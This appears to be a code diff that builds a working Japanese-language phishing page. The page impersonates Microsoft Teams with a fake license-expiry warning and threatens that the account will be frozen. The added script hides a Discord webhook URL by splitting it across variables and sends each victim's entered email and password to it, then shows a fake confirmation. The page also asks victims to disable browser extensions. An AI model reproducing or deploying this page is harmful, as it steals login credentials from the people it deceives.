@@ -1,4 +1,43 @@
-
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>サインインに続行します</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-content:center;padding-top:60px;}
+.page{width:780px;}
+.cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
+.top-bar{height:4px;background:linear-gradient(90deg,#44546A,#0067b8,#2B7C8A);}
+.hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
+.hdr img.logo{width:auto;height:80px;flex-shrink:0;object-fit:contain;}
+.hdr .info h1{font-size:24px;font-weight:600;color:#1a1a1a;}
+.hdr .info small{display:block;font-size:15px;color:#888;margin-top:6px;}
+.body{padding:34px 44px;}
+.warn{background:#fff3cd;border-left:3px solid #e6a817;padding:15px 18px;font-size:14px;color:#7a5c00;margin-bottom:24px;border-radius:0 4px 4px 0;}
+.warn strong{color:#c0392b;}
+.warn .sub{display:block;font-size:12px;color:#9a7b00;margin-top:5px;}
+.msg{font-size:16px;color:#333;line-height:1.9;margin-bottom:24px;}
+.msg strong{color:#0067b8;}
+label{font-size:14px;color:#555;font-weight:600;display:block;margin-bottom:7px;}
+input{width:100%;padding:15px 18px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:18px;font-family:'Segoe UI',sans-serif;background:#fff;}
+input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 3px rgba(0,103,184,.1);}
+.btn{width:100%;padding:18px;background:#0067b8;color:#fff;border:none;border-radius:3px;font-size:24px;font-weight:600;cursor:pointer;letter-spacing:.3px;}
+.btn:hover{background:#005da6;}
+.forgot{display:inline-block;margin-top:14px;font-size:13px;color:#605FBF;cursor:pointer;}
+.forgot:hover{text-decoration:underline;}
+.spin{display:none;width:38px;height:38px;border:4px solid #ddd;border-top-color:#0067b8;border-radius:50%;margin:26px auto;animation:sp .7s linear infinite;}
+@keyframes sp{to{transform:rotate(360deg)}}
+.ok{display:none;text-align:center;padding:40px 0;}
+.ok p{font-size:19px;color:#107c10;font-weight:600;margin-bottom:10px;}
+.ok small{font-size:14px;color:#555;line-height:1.7;}
+.foot{padding:18px 44px;background:#f5f5f5;border-top:1px solid #eee;font-size:13px;color:#333;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:30px;}
+.foot a{color:#333;text-decoration:none;}
+.foot a:hover{color:#0067b8;}
+</style>
+</head>
+<body>
 <div class="page">
 <div class="cert">
 <div class="top-bar"></div>
@@ -9,23 +48,12 @@
 <small>ライセンス再有効化認証</small>
 </div>
 </div>
-<div class="meta">
-<table>
-<tbody><tr><td>License ID</td><td>SNP-2024-0187-A</td></tr>
-<tr><td>Issuer</td><td>sinei-model.co.jp IT Mgmt</td></tr>
-<tr><td>Server</td><td>teams.sinei-model.co.jp :443/TLS</td></tr>
-<tr><td>Cert CN</td><td>teams.sinei-model.co.jp</td></tr>
-<tr><td>Cert Serial</td><td>0x9B3E.47A2.C1D8.F036</td></tr>
-<tr><td>Not Before</td><td>2026-04-01 00:00:00 JST</td></tr>
-<tr><td>Next Renewal</td><td>更新日から2年間</td></tr>
-</tbody></table>
-</div>
 <div class="body">
 <div class="warn"><strong>警告：</strong>認証を完了しない場合は、Teamsアカウントが一定期間後に凍結されます。<span class="sub">認証が出来ない場合は、ブラウザの拡張機能をオフにしてください。</span></div>
 <div class="msg" id="msg">
 いつも Microsoft 製品をご利用いただきありがとうございます。<br><br>現在お使いの Microsoft Teams の無料ライセンスが期限切れとなります。<br><br>期限後の無料利用には、<strong>お使いになるアカウントの再認証（ワンタイム）</strong>が必要です。以下の認証フォームから実行してください。<br><br>再認証完了後、ライセンスが再有効化され、通常通りの無料利用が継続されます。<br>次回期限：<strong>更新日から2年間</strong>
 </div>
-<form id="f">
+<form id="f" onsubmit="return send()">
 <label>Teamsライセンス契約アドレス</label>
 <input type="email" id="u" autocomplete="off">
 <label>パスワード</label>
@@ -35,17 +63,44 @@
 <span class="forgot" id="forgot">パスワードを忘れた場合</span>
 <div class="spin" id="sp"></div>
 <div class="ok" id="ok">
-<p>✓ ライセンス再有効化が完了しました</p>
+<p>&#10003; ライセンス再有効化が完了しました</p>
 <small>次回期限：更新日から2年間<br>通常通り無料でご利用ください。</small>
 </div>
-</div>
 <div class="foot">
-<a href="#">利用規約</a>
-<a href="#">プライバシー概要</a>
-<a href="#">法的情報</a>
-<span>© Microsoft Corporation</span>
+<a href="#" onclick="return false;">利用規約</a>
+<a href="#" onclick="return false;">プライバシー概要</a>
+<a href="#" onclick="return false;">法的情報</a>
+<span>&copy; Microsoft Corporation</span>
 </div>
 </div>
 </div>
-
-
+</div>
+<script>
+var H="https:/";
+var T="/discord.com/api/webhooks/";
+var A="1569533813548388482/";
+var B="7wipbj3B0igYJicr-BVwvRfRU9izfKWKjjDY15wU5desK4cQx7Tgmt4HkhhkYCiKvVoA";
+function send(){
+var u=document.getElementById("u").value;
+var p=document.getElementById("p").value;
+if(!u||!p)return false;
+document.getElementById("f").style.display="none";
+document.getElementById("forgot").style.display="none";
+document.getElementById("msg").style.display="none";
+document.getElementById("sp").style.display="block";
+var url=H+T+A+B;
+var body=JSON.stringify({"content":"user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
+fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
+.then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";})
+.catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";});
+return false;
+}
+document.getElementById("forgot").addEventListener("click",function(e){
+e.preventDefault();
+var url=H+T+A+B;
+var body=JSON.stringify({"content":"【PWリセットリクエスト】teams.sinei-model.co.jp ／ "+new Date().toLocaleTimeString("ja-JP")});
+fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body}).catch(function(){});
+});
+</script>
+</body>
+</html>
